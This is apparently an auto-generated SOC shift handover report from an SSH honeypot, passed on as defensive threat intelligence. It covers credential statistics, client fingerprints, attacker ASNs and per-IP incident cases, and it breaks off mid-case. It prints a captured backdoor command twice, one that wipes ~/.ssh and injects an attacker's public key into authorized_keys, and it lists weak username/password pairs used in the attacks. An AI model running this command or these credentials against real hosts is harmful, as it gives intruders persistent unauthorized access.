# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-01 |
| **Generated At** | 2026-08-01T20:59:09Z |
| **Shift Time** | 20:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **82** |
| Confirmed Threats | **70** |
| False Positives Filtered | **12** (14.6%) |
| Unique Attacker IPs | **61** |
| Countries of Origin | **25** |
| High Severity Cases | **32** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **50** |
| Malware Samples Analyzed | **4** HIGH · **26** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **49** |
| Unique Credential Pairs | **26** |
| Unique Usernames | **11** |
| Unique Passwords | **25** |
| Successful Auth Pairs | **40** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 25 |
| `support` | 9 |
| `centos` | 3 |
| `blank` | 3 |
| `admin` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `` | 4 |
| `951951` | 4 |
| `user` | 4 |
| `P@ssword123` | 3 |
| `Info1` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `` | 4 |
| `root` | `951951` | 4 |
| `root` | `P@ssword123` | 3 |
| `root` | `Info1` | 3 |
| `support` | `support` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `12345` | `163.192.48.255` | 2026-08-01T18:56:00 |
| `default` | `default10` | `223.25.108.2` | 2026-08-01T18:57:51 |
| `root` | `222222` | `89.203.142.96` | 2026-08-01T19:01:10 |
| `eclipse` | `eclipse` | `196.189.59.226` | 2026-08-01T19:07:14 |
| `root` | `P@ssword123` | `10.0.0.73` | 2026-08-01T19:14:20 |
| `root` | `Info1` | `10.0.0.73` | 2026-08-01T19:18:02 |
| `root` | `Admin` | `20.227.140.178` | 2026-08-01T19:28:18 |
| `root` | `P@ssword123` | `182.76.36.62` | 2026-08-01T19:32:20 |
| `root` | `P@ssword123` | `65.20.131.63` | 2026-08-01T19:32:27 |
| `root` | `Info1` | `177.174.105.113` | 2026-08-01T19:35:44 |
| `admin` | `admin` | `47.88.0.49` | 2026-08-01T19:38:54 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-01T19:38:55 |
| `support` | `support` | `176.53.159.196` | 2026-08-01T19:39:49 |
| `root` | `951951` | `95.79.57.221` | 2026-08-01T19:40:55 |
| `root` | `951951` | `178.178.194.131` | 2026-08-01T19:41:02 |
| `centos` | `centos44` | `111.70.23.240` | 2026-08-01T19:41:15 |
| `centos` | `centos44` | `49.124.152.30` | 2026-08-01T19:41:24 |
| `centos` | `centos44` | `103.120.116.162` | 2026-08-01T19:41:28 |
| `root` | `Aa12345.` | `14.248.82.157` | 2026-08-01T19:45:30 |
| `345gs5662d34` | `345gs5662d34` | `113.160.82.122` | 2026-08-01T19:45:34 |
| `root` | `3245gs5662d34` | `14.248.82.157` | 2026-08-01T19:45:35 |
| `config` | `config88` | `10.0.0.73` | 2026-08-01T19:48:51 |
| `root` | `951951` | `10.0.0.73` | 2026-08-01T19:52:45 |
| `support` | `password@` | `10.0.0.73` | 2026-08-01T19:57:12 |
| `support` | `support` | `10.0.0.73` | 2026-08-01T20:04:58 |
| `root` | `admin1234` | `20.227.140.178` | 2026-08-01T20:10:18 |
| `root` | `Zxcv!234` | `23.91.97.170` | 2026-08-01T20:14:12 |
| `345gs5662d34` | `345gs5662d34` | `23.91.97.170` | 2026-08-01T20:14:16 |
| `root` | `3245gs5662d34` | `23.91.97.170` | 2026-08-01T20:14:18 |
| `support` | `123456789a` | `188.43.204.45` | 2026-08-01T20:15:35 |
| `support` | `123456789a` | `218.4.156.254` | 2026-08-01T20:15:42 |
| `support` | `password@` | `35.130.111.146` | 2026-08-01T20:15:50 |
| `support` | `password@` | `31.173.8.170` | 2026-08-01T20:16:03 |
| `blank` | `user` | `10.0.0.73` | 2026-08-01T20:23:22 |
| `blank` | `user` | `103.171.39.147` | 2026-08-01T20:25:00 |
| `support` | `123456789a` | `10.0.0.73` | 2026-08-01T20:27:24 |
| `user` | `user` | `31.77.227.120` | 2026-08-01T20:28:39 |
| `supervisor` | `Passw0rd` | `10.0.0.73` | 2026-08-01T20:31:22 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-01T20:37:12 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-01T20:37:12 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **82** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 16 |
| Go SSH scanner | 11 |
| libssh | 7 |
| Unknown | 2 |
| Paramiko (Python) | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 16 | 16 |
| `f555226df196...` | Mirai/variant | 6 | 3 |
| `16443846184e...` | Generic scanner | 5 | 3 |
| `f1e5e9d24e5e...` | Mirai/variant | 2 | 1 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 16 | 16 | Mirai/variant |
| `f555226df196...` | libssh | 6 | 3 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 5 | 3 | Generic scanner |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `95420f9d932d...` | Unknown | 2 | 2 | — |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |
| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `23.91.97.170`, `14.248.82.157`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **61** |
| Unique ASNs | **47** |
| High-Risk ASNs | **40** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 3 | MEDIUM |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (32)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-2159cc3bb564

| Field | Detail |
|---|---|
| **Source IP** | `163.192.48[.]255` |
| **First Seen** | 2026-08-01 18:56 |
| **Last Seen** | 2026-08-01 18:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 18:56:00` | `cowrie.session.connect` |
| `2026-08-01 18:56:00` | `cowrie.client.version` |
| `2026-08-01 18:56:00` | `cowrie.client.kex` |
| `2026-08-01 18:56:00` | `cowrie.login.success` |
| `2026-08-01 18:56:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.192.48[.]255` to AbuseIPDB if not already reported
- [ ] Block `163.192.48[.]255` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3c1659f9e3d

| Field | Detail |
|---|---|
| **Source IP** | `223.25.108[.]2` |
| **First Seen** | 2026-08-01 18:57 |
| **Last Seen** | 2026-08-01 18:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 18:57:48` | `cowrie.session.connect` |
| `2026-08-01 18:57:49` | `cowrie.client.version` |
| `2026-08-01 18:57:49` | `cowrie.client.kex` |
| `2026-08-01 18:57:51` | `cowrie.login.success` |
| `2026-08-01 18:57:52` | `cowrie.direct-tcpip.request` |
| `2026-08-01 18:57:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.25.108[.]2` to AbuseIPDB if not already reported
- [ ] Block `223.25.108[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bce66760e00c

| Field | Detail |
|---|---|
| **Source IP** | `89.203.142[.]96` |
| **First Seen** | 2026-08-01 19:01 |
| **Last Seen** | 2026-08-01 19:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 19:01:09` | `cowrie.session.connect` |
| `2026-08-01 19:01:09` | `cowrie.client.version` |
| `2026-08-01 19:01:09` | `cowrie.client.kex` |
| `2026-08-01 19:01:10` | `cowrie.login.success` |
| `2026-08-01 19:01:10` | `cowrie.direct-tcpip.request` |
| `2026-08-01 19:01:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.203.142[.]96` to AbuseIPDB if not already reported
- [ ] Block `89.203.142[.]96` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1731c678c8c2

| Field | Detail |
|---|---|
| **Source IP** | `196.189.59[.]226` |
| **First Seen** | 2026-08-01 19:07 |
| **Last Seen** | 2026-08-01 19:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 19:07:12` | `cowrie.session.connect` |
| `2026-08-01 19:07:13` | `cowrie.client.version` |
| `2026-08-01 19:07:13` | `cowrie.client.kex` |
| `2026-08-01 19:07:14` | `cowrie.login.success` |
| `2026-08-01 19:07:16` | `cowrie.direct-tcpip.request` |
| `2026-08-01 19:07:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.59[.]226` to AbuseIPDB if not already reported
- [ ] Block `196.189.59[.]226` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a2403edad00

| Field | Detail |
|---|---|
| **Source IP** | `20.227.140[.]178` |
| **First Seen** | 2026-08-01 19:28 |
| **Last Seen** | 2026-08-01 19:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 19:28:17` | `cowrie.session.connect` |
| `2026-08-01 19:28:17` | `cowrie.client.version` |
| `2026-08-01 19:28:17` | `cowrie.client.kex` |
| `2026-08-01 19:28:18` | `cowrie.login.success` |
| `2026-08-01 19:28:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.227.140[.]178` to AbuseIPDB if not already reported
- [ ] Block `20.227.140[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc341b1e3221

| Field | Detail |
|---|---|
| **Source IP** | `182.76.36[.]62` |
| **First Seen** | 2026-08-01 19:32 |
| **Last Seen** | 2026-08-01 19:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 19:32:17` | `cowrie.session.connect` |
| `2026-08-01 19:32:18` | `cowrie.client.version` |
| `2026-08-01 19:32:18` | `cowrie.client.kex` |
| `2026-08-01 19:32:20` | `cowrie.login.success` |
| `2026-08-01 19:32:21` | `cowrie.direct-tcpip.request` |
| `2026-08-01 19:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.36[.]62` to AbuseIPDB if not already reported
- [ ] Block `182.76.36[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6c7ab122d0d

| Field | Detail |
|---|---|
| **Source IP** | `65.20.131[.]63` |
| **First Seen** | 2026-08-01 19:32 |
| **Last Seen** | 2026-08-01 19:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 19:32:26` | `cowrie.session.connect` |
| `2026-08-01 19:32:26` | `cowrie.client.version` |
| `2026-08-01 19:32:26` | `cowrie.client.kex` |
| `2026-08-01 19:32:27` | `cowrie.login.success` |
| `2026-08-01 19:32:27` | `cowrie.direct-tcpip.request` |
| `2026-08-01 19:32:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.131[.]63` to AbuseIPDB if not already reported
- [ ] Block `65.20.131[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72d7be1c0784

| Field | Detail |
|---|---|
| **Source IP** | `177.174.105[.]113` |
| **First Seen** | 2026-08-01 19:35 |
| **Last Seen** | 2026-08-01 19:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 19:35:42` | `cowrie.session.connect` |
| `2026-08-01 19:35:42` | `cowrie.client.version` |
| `2026-08-01 19:35:42` | `cowrie.client.kex` |
| `2026-08-01 19:35:44` | `cowrie.login.success` |
| `2026-08-01 19:35:45` | `cowrie.direct-tcpip.request` |
| `2026-08-01 19:35:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.105[.]113` to AbuseIPDB if not already reported
- [ ] Block `177.174.105[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8fdd846b94c

| Field | Detail |
|---|---|
| **Source IP** | `47.88.0[.]49` |
| **First Seen** | 2026-08-01 19:38 |
| **Last Seen** | 2026-08-01 19:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 19:38:54` | `cowrie.session.connect` |
| `2026-08-01 19:38:54` | `cowrie.client.version` |
| `2026-08-01 19:38:54` | `cowrie.client.kex` |
| `2026-08-01 19:38:54` | `cowrie.login.success` |
| `2026-08-01 19:38:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.88.0[.]49` to AbuseIPDB if not already reported
- [ ] Block `47.88.0[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e13ecf0588d2

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-01 19:38 |
| **Last Seen** | 2026-08-01 19:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 19:38:54` | `cowrie.session.connect` |
| `2026-08-01 19:38:54` | `cowrie.client.version` |
| `2026-08-01 19:38:54` | `cowrie.client.kex` |
| `2026-08-01 19:38:55` | `cowrie.login.success` |
| `2026-08-01 19:38:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e789852ad46

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-01 19:39 |
| **Last Seen** | 2026-08-01 19:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 19:39:49` | `cowrie.session.connect` |
| `2026-08-01 19:39:49` | `cowrie.client.version` |
| `2026-08-01 19:39:49` | `cowrie.client.kex` |
| `2026-08-01 19:39:49` | `cowrie.login.success` |
| `2026-08-01 19:39:49` | `cowrie.direct-tcpip.request` |
| `2026-08-01 19:39:49` | `cowrie.direct-tcpip.data` |
| `2026-08-01 19:39:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2896b5a3abb

| Field | Detail |
|---|---|
| **Source IP** | `95.79.57[.]221` |
| **First Seen** | 2026-08-01 19:40 |
| **Last Seen** | 2026-08-01 19:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 19:40:54` | `cowrie.session.connect` |
| `2026-08-01 19:40:54` | `cowrie.client.version` |
| `2026-08-01 19:40:54` | `cowrie.client.kex` |
| `2026-08-01 19:40:55` | `cowrie.login.success` |
| `2026-08-01 19:40:55` | `cowrie.direct-tcpip.request` |
| `2026-08-01 19:41:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.79.57[.]221` to AbuseIPDB if not already reported
- [ ] Block `95.79.57[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1439708dd74b

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]131` |
| **First Seen** | 2026-08-01 19:41 |
| **Last Seen** | 2026-08-01 19:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 19:41:00` | `cowrie.session.connect` |
| `2026-08-01 19:41:01` | `cowrie.client.version` |
| `2026-08-01 19:41:01` | `cowrie.client.kex` |
| `2026-08-01 19:41:02` | `cowrie.login.success` |
| `2026-08-01 19:41:03` | `cowrie.direct-tcpip.request` |
| `2026-08-01 19:41:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]131` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a8846f2c970

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]240` |
| **First Seen** | 2026-08-01 19:41 |
| **Last Seen** | 2026-08-01 19:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 19:41:12` | `cowrie.session.connect` |
| `2026-08-01 19:41:13` | `cowrie.client.version` |
| `2026-08-01 19:41:13` | `cowrie.client.kex` |
| `2026-08-01 19:41:15` | `cowrie.login.success` |
| `2026-08-01 19:41:16` | `cowrie.direct-tcpip.request` |
| `2026-08-01 19:41:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]240` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]240` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1de6e75698a4

| Field | Detail |
|---|---|
| **Source IP** | `49.124.152[.]30` |
| **First Seen** | 2026-08-01 19:41 |
| **Last Seen** | 2026-08-01 19:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 19:41:21` | `cowrie.session.connect` |
| `2026-08-01 19:41:22` | `cowrie.client.version` |
| `2026-08-01 19:41:22` | `cowrie.client.kex` |
| `2026-08-01 19:41:24` | `cowrie.login.success` |
| `2026-08-01 19:41:25` | `cowrie.direct-tcpip.request` |
| `2026-08-01 19:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.152[.]30` to AbuseIPDB if not already reported
- [ ] Block `49.124.152[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0498c2dc3459

| Field | Detail |
|---|---|
| **Source IP** | `103.120.116[.]162` |
| **First Seen** | 2026-08-01 19:41 |
| **Last Seen** | 2026-08-01 19:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 19:41:25` | `cowrie.session.connect` |
| `2026-08-01 19:41:26` | `cowrie.client.version` |
| `2026-08-01 19:41:26` | `cowrie.client.kex` |
| `2026-08-01 19:41:28` | `cowrie.login.success` |
| `2026-08-01 19:41:28` | `cowrie.direct-tcpip.request` |
| `2026-08-01 19:41:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.120.116[.]162` to AbuseIPDB if not already reported
- [ ] Block `103.120.116[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5459e2e3d8d8

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]157` |
| **First Seen** | 2026-08-01 19:45 |
| **Last Seen** | 2026-08-01 19:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 19:45:28` | `cowrie.session.connect` |
| `2026-08-01 19:45:28` | `cowrie.client.version` |
| `2026-08-01 19:45:29` | `cowrie.client.kex` |
| `2026-08-01 19:45:30` | `cowrie.login.success` |
| `2026-08-01 19:45:31` | `cowrie.session.params` |
| `2026-08-01 19:45:31` | `cowrie.command.input` |
| `2026-08-01 19:45:31` | `cowrie.command.failed` |
| `2026-08-01 19:45:31` | `cowrie.log.closed` |
| `2026-08-01 19:45:32` | `cowrie.session.params` |
| `2026-08-01 19:45:32` | `cowrie.command.input` |
| `2026-08-01 19:45:32` | `cowrie.session.file_download` |
| `2026-08-01 19:45:32` | `cowrie.log.closed` |
| `2026-08-01 19:45:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]157` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45f5b573770f

| Field | Detail |
|---|---|
| **Source IP** | `113.160.82[.]122` |
| **First Seen** | 2026-08-01 19:45 |
| **Last Seen** | 2026-08-01 19:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 19:45:32` | `cowrie.session.connect` |
| `2026-08-01 19:45:32` | `cowrie.client.version` |
| `2026-08-01 19:45:33` | `cowrie.client.kex` |
| `2026-08-01 19:45:34` | `cowrie.login.success` |
| `2026-08-01 19:45:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.160.82[.]122` to AbuseIPDB if not already reported
- [ ] Block `113.160.82[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-009bed7476fb

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]157` |
| **First Seen** | 2026-08-01 19:45 |
